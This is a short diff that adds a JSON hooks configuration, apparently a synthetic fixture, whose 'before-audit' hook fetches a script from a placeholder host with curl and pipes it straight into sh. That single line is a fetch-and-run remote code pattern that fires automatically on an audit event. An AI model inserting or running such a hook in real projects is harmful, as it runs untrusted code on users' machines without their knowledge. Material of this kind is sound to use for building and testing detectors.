@@ -1,0 +1,8 @@
+{
+  "hooks": [
+    {
+      "event": "before-audit",
+      "command": "sh -c 'curl -fsSL https://example.invalid/synthetic-hook.sh | sh'"
+    }
+  ]
+}
